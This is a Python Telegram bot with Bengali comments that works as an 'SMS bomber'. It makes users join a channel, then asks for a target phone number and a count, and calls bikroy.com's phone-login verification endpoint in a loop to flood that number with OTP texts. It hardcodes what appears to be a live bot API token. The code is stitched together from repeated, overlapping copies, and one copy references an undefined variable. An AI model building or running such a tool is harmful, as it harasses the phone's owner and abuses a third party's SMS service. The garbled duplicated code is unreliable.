import telebot
import requests
import time
from telebot import types
from flask import Flask
from threading import Thread

# ১. আপনার টোকেন ও সেটিংস
API_TOKEN = '8678067992:AAEDkPkmtuz86YnrMJcnIVcp19tL52tkyRk'
CHANNEL_USERNAME = '@developer_of_maruf' 

bot = telebot.TeleBot(API_TOKEN)
user_data = {}

# ২. বোট সচল রাখার জন্য ছোট সার্ভার (যাতে Render অফ না করে)
app = Flask('')

@app.route('/')
def home():
    return "Bot is Running!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

# ৩. জয়েন চেক ফাংশন
def check_join(chat_id):
    try:
        status = bot.get_chat_member(CHANNEL_USERNAME, chat_id).status
        return status in ['member', 'administrator', 'creator']
    except: return False

# ৪. স্টার্ট কমান্ড
@bot.message_handler(commands=['start'])
def welcome(message):
    chat_id = message.chat.id
    if check_join(chat_id):
        msg = bot.send_message(chat_id, "✅ ভেরিফিকেশন সফল!\n\nSMS পাঠাতে আপনার নাম্বারটি লিখুন:")
        bot.register_next_step_handler(msg, get_number)
    else:
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 Join Channel", url="https://t.me/developer_of_maruf"))
        markup.add(types.InlineKeyboardButton("🔄 Verify Done", callback_data="verify"))
        bot.send_message(chat_id, "❌ বোটটি ব্যবহার করতে আগে আমাদের চ্যানেলে জয়েন করুন!", reply_markup=markup)

# ৫. ভেরিফাই বাটন হ্যান্ডলার
@bot.callback_query_handler(func=lambda call: call.data == "verify")
def verify(call):
    chat_id = call.message.chat.id
    if check_join(chat_id):
        bot.delete_message(chat_id, call.message.message_id)
        msg = bot.send_message(chat_id, "✅ সফল! এখন আপনার নাম্বারটি লিখুন:")
        bot.register_next_step_handler(msg, get_number)
    else:
        bot.answer_callback_query(call.id, "❌ আপনি এখনো জয়েন হননি!", show_alert=True)

# ৬. নাম্বার ইনপুট
def get_number(message):
    if not message.text or not message.text.isdigit() or len(message.text) < 11:
        msg = bot.reply_to(message, "❌ সঠিক ১১ ডিজিটের নাম্বার দিন:")
        bot.register_next_step_handler(msg, get_number)
        return
    user_data[message.chat.id] = {'number': message.text}
    msg = bot.reply_to(message, "🔢 কতটি SMS পাঠাতে চান (Amount) লিখুন:")
    bot.register_next_step_handler(msg, get_amount)

# ৭. SMS পাঠানো
def get_amount(message):
    try:
        amount = int(message.text)
        chat_id = message.chat.id
        number = user_data[chat_id]['number']
        
        bot.send_message(chat_id, f"🚀 {number} নাম্বারে {amount}টি SMS পাঠানো শুরু হচ্ছে...")

        # SMS পাঠানোর API
        api = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={number}"

        for i in range(amount):
            requests.get(api, timeout=5)

        bot.send_message(chat_id, f"✅ অভিনন্দন! সফলভাবে {amount}টি SMS পাঠানো হয়েছে।\n\nআবার নতুন করে পাঠাতে /start লিখুন।")
        
    except Exception:
        msg = bot.reply_to(message, "⚠️ ভুল হয়েছে! শুধু সংখ্যা লিখুন (যেমন: ১০):")
        bot.register_next_step_handler(msg, get_amount)

# ৮. মেইন লুপ
if __name__ == "__main__":
    keep_alive() # Render-এ বোট সচল রাখবে
    print("বোট লাইভ হয়েছে...")
    bot.infinity_polling(timeout=10, long_polling_timeout=5)@bot.message_handler(commands=['start'])
def welcome(message):
    chat_id = message.chat.id
    if check_join(chat_id):
        msg = bot.send_message(chat_id, "✅ ভেরিফিকেশন সফল!\nএখন SMS পাঠাতে আপনার নাম্বারটি লিখুন:")
        bot.register_next_step_handler(msg, get_number)
    else:
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 Join Channel", url="https://t.me/developer_of_maruf"))
        markup.add(types.InlineKeyboardButton("🔄 Verify Done", callback_data="verify"))
        bot.send_message(chat_id, "❌ বোটটি ব্যবহার করতে আগে আমাদের চ্যানেলে জয়েন করুন!", reply_markup=markup)

# ৫. ভেরিফাই বাটন হ্যান্ডলার
@bot.callback_query_handler(func=lambda call: call.data == "verify")
def verify(call):
    chat_id = call.message.chat.id
    if check_join(chat_id):
        bot.delete_message(chat_id, call.message.message_id)
        msg = bot.send_message(chat_id, "✅ সফল! এখন আপনার নাম্বারটি লিখুন:")
        bot.register_next_step_handler(msg, get_number)
    else:
        bot.answer_callback_query(call.id, "❌ আপনি এখনো জয়েন হননি!", show_alert=True)

# ৬. নাম্বার ইনপুট
def get_number(message):
    if not message.text or not message.text.isdigit() or len(message.text) < 11:
        msg = bot.reply_to(message, "❌ সঠিক ১১ ডিজিটের নাম্বার দিন:")
        bot.register_next_step_handler(msg, get_number)
        return
    user_data[message.chat.id] = {'number': message.text}
    msg = bot.reply_to(message, "🔢 কতটি SMS পাঠাতে চান (Amount) লিখুন:")
    bot.register_next_step_handler(msg, get_amount)

# ৭. SMS পাঠানো
def get_amount(message):
    try:
        amount = int(message.text)
        chat_id = message.chat.id
        number = user_data[chat_id]['number']
        
        bot.send_message(chat_id, f"🚀 {number} নাম্বারে {amount}টি SMS পাঠানো শুরু হচ্ছে...")

        # SMS পাঠানোর API
        api = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={number}"

        for i in range(amount):
            requests.get(api, timeout=5)

        bot.send_message(chat_id, f"✅ অভিনন্দন! সফলভাবে {amount}টি SMS পাঠানো হয়েছে।\n\nআবার নতুন করে পাঠাতে /start লিখুন।")
        
    except Exception:
        msg = bot.reply_to(message, "⚠️ ভুল হয়েছে! শুধু সংখ্যা লিখুন (যেমন: ১০):")
        bot.register_next_step_handler(msg, get_amount)

# ৮. মেইন লুপ
if __name__ == "__main__":
    keep_alive() # Render-এ বোট সচল রাখবে
    print("বোট লাইভ হয়েছে...")
    bot.infinity_polling(timeout=10, long_polling_timeout=5)
@bot.message_handler(commands=['start'])
def welcome(message):
    chat_id = message.chat.id
    if check_join(chat_id):
        msg = bot.send_message(chat_id, "✅ ভেরিফিকেশন সফল!\nএখন SMS পাঠাতে আপনার নাম্বারটি লিখুন:")
        bot.register_next_step_handler(msg, get_number)
    else:
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 Join Channel", url="https://t.me/developer_of_maruf"))
        markup.add(types.InlineKeyboardButton("🔄 Verify Done", callback_data="verify"))
        bot.send_message(chat_id, "❌ বোটটি ব্যবহার করতে আগে আমাদের চ্যানেলে জয়েন করুন!", reply_markup=markup)

# ৫. ভেরিফাই বাটন হ্যান্ডলার
@bot.callback_query_handler(func=lambda call: call.data == "verify")
def verify(call):
    chat_id = call.message.chat.id
    if check_join(chat_id):
        bot.delete_message(chat_id, call.message.message_id)
        msg = bot.send_message(chat_id, "✅ সফল! এখন আপনার নাম্বারটি লিখুন:")
        bot.register_next_step_handler(msg, get_number)
    else:
        bot.answer_callback_query(call.id, "❌ আপনি এখনো জয়েন হননি!", show_alert=True)

# ৬. নাম্বার ইনপুট
def get_number(message):
    if not message.text or not message.text.isdigit() or len(message.text) < 11:
        msg = bot.reply_to(message, "❌ সঠিক ১১ ডিজিটের নাম্বার দিন:")
        bot.register_next_step_handler(msg, get_number)
        return
    user_data[message.chat.id] = {'number': message.text}
    msg = bot.reply_to(message, "🔢 কতটি SMS পাঠাতে চান (Amount) লিখুন:")
    bot.register_next_step_handler(msg, get_amount)

# ৭. SMS পাঠানো
def get_amount(message):
    try:
        amount = int(message.text)
        chat_id = message.chat.id
        number = user_data[chat_id]['number']
        
        bot.send_message(chat_id, f"🚀 {number} নাম্বারে {amount}টি SMS পাঠানো শুরু হচ্ছে...")

        # SMS পাঠানোর API
        api = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={number}"

        for i in range(amount):
            requests.get(api, timeout=5)

        bot.send_message(chat_id, f"✅ অভিনন্দন! সফলভাবে {amount}টি SMS পাঠানো হয়েছে।\n\nআবার নতুন করে পাঠাতে /start লিখুন।")
        
    except Exception:
        msg = bot.reply_to(message, "⚠️ ভুল হয়েছে! শুধু সংখ্যা লিখুন (যেমন: ১০):")
        bot.register_next_step_handler(msg, get_amount)

# ৮. মেইন লুপ
if __name__ == "__main__":
    keep_alive() # Render-এ বোট সচল রাখবে
    print("বোট লাইভ হয়েছে...")
    bot.infinity_polling(timeout=10, long_polling_timeout=5)@bot.callback_query_handler(func=lambda call: call.data == "verify")
def verify(call):
    if check_join(call.message.chat.id):
        bot.delete_message(call.message.chat.id, call.message.message_id)
        msg = bot.send_message(call.message.chat.id, "✅ সফল! এখন আপনার নাম্বারটি লিখুন:")
        bot.register_next_step_handler(msg, get_number)
    else:
        bot.answer_callback_query(call.id, "❌ আপনি এখনো জয়েন হননি!", show_alert=True)

# ৫. নাম্বার ও এমাউন্ট নেওয়া
def get_number(message):
    if not message.text or not message.text.isdigit() or len(message.text) < 11:
        msg = bot.reply_to(message, "❌ সঠিক ১১ ডিজিটের নাম্বার দিন:")
        bot.register_next_step_handler(msg, get_number)
        return
    user_data[message.chat.id] = {'number': message.text}
    msg = bot.reply_to(message, "🔢 কতটি SMS পাঠাতে চান?")
    bot.register_next_step_handler(msg, get_amount)

def get_amount(message):
    try:
        amount = int(message.text)
        num = user_data[message.chat.id]['number']
        bot.send_message(message.chat.id, f"🚀 {num} এ {amount}টি SMS যাচ্ছে...\n\n📢 স্পন্সর অফার: {GPLINK_AD}")
        for i in range(amount):
            requests.get(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={num}", timeout=5)
        bot.send_message(message.chat.id, "✅ কাজ শেষ! আবার পাঠাতে /start দিন।")
    except: pass

# ৬. আপনার জিজ্ঞাসিত অংশ (এটি সবার শেষে থাকবে)
if __name__ == "__main__":
    print("বোট চালু হয়েছে...")
    # Render এর টাইম আউট সমস্যা এড়াতে এই সেটিংস
    bot.infinity_polling(timeout=10, long_polling_timeout=5)
